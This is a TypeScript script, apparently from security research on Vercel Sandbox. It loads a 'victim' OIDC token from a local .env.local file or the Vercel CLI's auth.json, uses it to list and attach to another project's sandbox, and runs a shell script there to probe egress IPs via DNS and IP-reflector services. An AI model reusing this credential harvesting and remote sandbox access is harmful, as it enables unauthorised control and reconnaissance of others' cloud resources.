import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";
const raw = (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;

async function main() {
  const client = new raw({ token: VICTIM, teamId, projectId });
  const l: any = await client.listSandboxes({ projectId, limit: 50 });
  const sbxs = l.json?.sandboxes ?? l.json ?? [];
  const target = sbxs.find((s: any) => s.name?.startsWith("curl-v3-"));
  if (!target) { console.error("no sandbox"); process.exit(1); }
  const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
  const dom = s.domain(3000);
  console.log("DOMAIN:", dom);

  // script para ver el egress del sandbox: usa dig TXT y curl a un reflector
  const SCRIPT = `
set +e
echo "=== egress via DNS TXT (o-o.myaddr.l.google.com) ==="
dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>/dev/null | head -2
echo "=== egress via ipify (https) ==="
timeout 6 curl -s --max-time 5 https://api.ipify.org 2>/dev/null
echo ""
echo "=== egress via ifconfig.me ==="
timeout 6 curl -s --max-time 5 https://ifconfig.me 2>/dev/null
echo ""
echo "=== egress via api64 ==="
timeout 6 curl -s --max-time 5 https://api64.ipify.org 2>/dev/null
echo ""
echo "=== mi IP interna ==="
ip -o addr | grep eth0 | grep inet
echo "=== DONE ==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
  console.log("KEEP_ALIVE=" + dom);
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });